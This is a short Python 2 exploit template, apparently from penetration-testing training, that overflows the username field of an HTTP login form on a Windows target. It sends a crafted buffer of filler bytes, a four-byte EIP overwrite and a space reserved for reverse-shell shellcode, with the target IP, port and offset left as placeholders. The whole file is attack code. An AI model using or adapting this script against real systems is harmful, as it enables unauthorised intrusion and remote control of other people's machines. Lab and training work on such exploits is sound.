#!/usr/bin/python
# This fuzzer is used to expand the amount of data sent to the buffer to locate space for the shellcode
# Buffer size in this template is 1500 bytes length total, modify if required
# Proper reverse shellcode requires at least 350-400 bytes to execute in Windows
import socket

try:
	print "\nSending evil buffer…"
	
	filler = "A" * <bytes> # byte size found with msf_pattern_offset tools
	eip = "B" * 4 # verify that BBBB is stored in EIP at crash time
	offset = "C" * 4 # adds CCCC to fill in the space between the EIP and ESP
	buffer = "D" * (1500 - len(filler) - len(eip) - len(offset)) # placeholder for shellcode
	
	inputBuffer = filler + eip + offset + buffer
	content = "username=" + inputBuffer + "&password=A"
	
	buffer = "POST /login HTTP/1.1\r\n"
	buffer += "Host: <TargetIP>\r\n"
	buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
	buffer += "Accept: text/html,application/xhtml,application/xml;q=0.9,*/*;q=0.8\r\n"
	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
	buffer += "Referer: http:// <TargetIP>/login\r\n" #REMOVE SPACE IN URL
	buffer += "Connection: close\r\n"
	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
	buffer += "Content-Length: "+str(len(content))+"\r\n"
	buffer += "\r\n"
	buffer += content
	
	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("<TargetIP>", <Port>))
	s.send(buffer)
	s.close()
	print "\nDone!"
